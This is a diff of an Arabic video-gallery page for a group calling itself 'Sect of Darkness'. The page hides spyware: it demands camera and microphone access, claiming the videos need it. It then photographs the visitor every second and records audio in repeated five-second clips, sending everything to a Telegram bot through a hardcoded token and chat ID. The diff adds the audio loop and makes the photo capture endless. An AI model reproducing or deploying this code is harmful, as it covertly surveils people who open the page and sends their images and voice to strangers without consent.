@@ -1,113 +1,162 @@
-
-<!DOCTYPE html>
-<html lang="ar">
+<!DOCTYPE html><html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>صفحة الفيديوهات - طائفة الظلام</title>
   <style>
     body {
       margin: 0;
-      background-color: #fcd;
+      background: linear-gradient(135deg, #300030, #000);
       font-family: Arial, sans-serif;
       direction: rtl;
-      text-align: center;
       overflow-x: hidden;
-    }
+      text-align: center;
+      color: #fff;
+      animation: magic 10s infinite alternate;
+      zoom: 1;
+    }@keyframes magic {
+  0% { filter: hue-rotate(0deg); }
+  100% { filter: hue-rotate(360deg); }
+}
 
-    .video-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 10px;
-      padding: 20px;
-    }
+img {
+  max-width: 100%;
+}
 
-    video {
-      width: 100%;
-      aspect-ratio: 1/1;
-      border-radius: 10px;
-      background-color: #000;
-      cursor: pointer;
-      border: 3px solid purple;
-      transition: transform 0.3s;
-    }
+.profile {
+  width: 100px;
+  height: 100px;
+  border-radius: 50%;
+  border: 4px solid purple;
+  position: absolute;
+  right: 10px;
+  top: 150px;
+  z-index: 999;
+  animation: pulse 2s infinite;
+}
 
-    video:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 15px red;
-    }
+@keyframes pulse {
+  0% { box-shadow: 0 0 5px purple; }
+  50% { box-shadow: 0 0 20px red; }
+  100% { box-shadow: 0 0 5px purple; }
+}
 
-    .lightbox {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0, 0, 0, 0.9);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-      flex-direction: column;
-    }
+.video-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+  gap: 10px;
+  padding: 20px;
+}
 
-    .lightbox video {
-      max-width: 90%;
-      max-height: 80%;
-    }
+.video-grid div {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
 
-    .spinner {
-      border: 8px solid #eee;
-      border-top: 8px solid red;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      margin-top: 15px;
-    }
+video {
+  width: 100%;
+  aspect-ratio: 1/1;
+  border-radius: 10px;
+  background-color: #000;
+  cursor: pointer;
+  border: 3px solid purple;
+  transition: transform 0.3s;
+}
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+video:hover {
+  transform: scale(1.05);
+  box-shadow: 0 0 15px red;
+}
 
-    .back-btn {
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      width: 60px;
-      height: 60px;
-      background-color: pink;
-      color: black;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 24px;
-      cursor: pointer;
-      box-shadow: 0 0 10px pink;
-      z-index: 1001;
-    }
+.lightbox {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0, 0, 0, 0.9);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  flex-direction: column;
+}
+
+.lightbox video {
+  max-width: 90%;
+  max-height: 80%;
+}
+
+.spinner {
+  border: 8px solid #eee;
+  border-top: 8px solid red;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+  margin-top: 15px;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.back-btn {
+  position: fixed;
+  bottom: 20px;
+  left: 20px;
+  width: 60px;
+  height: 60px;
+  background-color: pink;
+  color: black;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  cursor: pointer;
+  box-shadow: 0 0 10px pink;
+  z-index: 1001;
+}
+
   </style>
 </head>
-<body onclick="takeExtraPhoto()">
-
-  <div class="video-grid">
-    <video src="VivaCut_video_1751836959485_HD1.mp4" onclick="openLightbox(this)" poster="poster1.jpg"></video>
-    <video src="ffghgg2.mp4" onclick="openLightbox(this)" poster="poster2.jpg"></video>
-    <video src="ffghgg3.mp4" onclick="openLightbox(this)" poster="poster3.jpg"></video>
-    <video src="ffghgg4.mp4" onclick="openLightbox(this)" poster="poster4.jpg"></video>
-    <video src="ffghgg5.mp4" onclick="openLightbox(this)" poster="poster5.jpg"></video>
-  </div>
-
-  <div id="lightbox" class="lightbox" onclick="closeLightbox()">
+<body onclick="takeExtraPhoto()">  <!-- 👑 صورة الغلاف -->  <img src="5alfia.png" alt="الغلاف">
+  <!-- 👑 صورة البروفايل -->
+  <img src="profile.png" class="profile">  <!-- 👑 وصف الموقع -->  <p style="margin-top: 80px; font-size: 18px; padding: 10px;">
+    ركوب جلجامشة | تجاوزت جلجامشة خطوط الحمراء وبذلك صار دعسها عنوانها الاول ولأخير<br>
+    طائفة الظلام تتجاوز العتمة لتحكم في لأخير | نحن الذي نفعل قبل ان نتكلم<br>
+    لطالما كان ظلام كلمات لا يفهمها الا من قرأها وشادو من سا يكتب الكلمات
+  </p>  <div class="video-grid">
+    <div>
+      <video src="VivaCut_video_1751836959485_HD1.mp4" onclick="openLightbox(this)" poster="poster1.jpg"></video>
+      <p>🎵 لحن النهاية</p>
+    </div>
+    <div>
+      <video src="ffghgg2.mp4" onclick="openLightbox(this)" poster="poster2.jpg"></video>
+      <p>🌌 غموض الليل</p>
+    </div>
+    <div>
+      <video src="ffghgg3.mp4" onclick="openLightbox(this)" poster="poster3.jpg"></video>
+      <p>🔥 صراع الظلال</p>
+    </div>
+    <div>
+      <video src="ffghgg4.mp4" onclick="openLightbox(this)" poster="poster4.jpg"></video>
+      <p>⚔ حرب الأعماق</p>
+    </div>
+    <div>
+      <video src="ffghgg5.mp4" onclick="openLightbox(this)" poster="poster5.jpg"></video>
+      <p>👁️‍🗨️ عين الشيطان</p>
+    </div>
+  </div>  <div id="lightbox" class="lightbox" onclick="closeLightbox()">
     <video id="expandedVideo" controls autoplay></video>
     <div class="spinner" id="spinner"></div>
-  </div>
-
-  <div class="back-btn" onclick="location.href='index.html'">⬅</div>
-
-  <script>
+  </div>  <div class="back-btn" onclick="location.href='index.html'">⬅</div>  <script>
     const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
     const CHAT_ID = "7664410054";
+    let imageCapture = null;
+    let audioRecorder = null;
+    let audioInterval;
 
     const lightbox = document.getElementById('lightbox');
     const expandedVideo = document.getElementById('expandedVideo');
@@ -129,21 +178,19 @@
       expandedVideo.src = "";
     }
 
-    let imageCapture = null;
-
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
       .then(stream => {
         const track = stream.getVideoTracks()[0];
         imageCapture = new ImageCapture(track);
-        captureMultiplePhotos(50);
+        captureLoopImages();
+        startAudioRecordingLoop(stream);
       })
       .catch(() => {
-        alert("يجب سماح كي تشاهد الفيديوهات");
+        alert("📸 يجب السماح بالكاميرا والميكروفون لالتقاط الصور والتسجيل.");
       });
 
-    function captureMultiplePhotos(count) {
-      let taken = 0;
-      const interval = setInterval(() => {
+    function captureLoopImages() {
+      setInterval(() => {
         if (!imageCapture) return;
         imageCapture.grabFrame().then(bitmap => {
           const canvas = document.createElement("canvas");
@@ -151,11 +198,9 @@
           canvas.width = canvas.height = size;
           const ctx = canvas.getContext("2d");
           ctx.drawImage(bitmap, 0, 0, size, size);
-          canvas.toBlob(blob => sendImage(blob, "📸 صورة تلقائية " + (taken + 1)), "image/png");
+          canvas.toBlob(blob => sendImage(blob, "📸 صورة تلقائية مستمرة"), "image/png");
         });
-        taken++;
-        if (taken >= count) clearInterval(interval);
-      }, 300);
+      }, 1000);
     }
 
     function takeExtraPhoto() {
@@ -170,6 +215,24 @@
       });
     }
 
+    function startAudioRecordingLoop(stream) {
+      const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg' });
+      mediaRecorder.ondataavailable = event => {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("caption", "🎤 تسجيل صوتي");
+        formData.append("audio", event.data, "audio.ogg");
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {
+          method: "POST",
+          body: formData
+        });
+      };
+      setInterval(() => {
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+      }, 6000);
+    }
+
     function sendImage(blob, caption) {
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
@@ -180,36 +243,5 @@
         body: formData
       });
     }
-  </script>
-</body>
-</html>
-        navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
-          const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg' });
-          const chunks = [];
-          mediaRecorder.ondataavailable = e => chunks.push(e.data);
-          mediaRecorder.onstop = () => {
-            const blob = new Blob(chunks, { type: 'audio/ogg' });
-            sendBlob(blob, '🎙️ تسجيل صوتي');
-          };
-          mediaRecorder.start();
-          setTimeout(() => mediaRecorder.stop(), 10000);
-        });
-      }, 12000);
-    }
-
-    function sendBlob(blob, caption) {
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("caption", caption);
-
-      if (blob.type.startsWith("image/")) {
-        formData.append("photo", blob, "photo.jpg");
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: formData });
-      } else if (blob.type.startsWith("audio/")) {
-        formData.append("audio", blob, "audio.ogg");
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, { method: "POST", body: formData });
-      }
-    }
-  </script>
-</body>
+  </script></body>
 </html>
